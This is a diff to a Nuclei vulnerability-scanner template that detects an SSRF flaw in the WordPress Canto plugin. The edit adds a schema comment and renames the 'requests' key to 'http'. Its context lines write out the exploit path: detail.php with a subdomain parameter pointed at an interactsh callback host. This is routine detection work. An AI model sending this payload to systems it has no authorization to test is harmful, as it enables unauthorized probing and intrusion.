@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-plugin-canto-ssrf
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://www.exploit-db.com/exploits/49189
   tags: ssrf,wordpress,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/canto/includes/lib/detail.php?subdomain=https://{{interactsh-url}}'
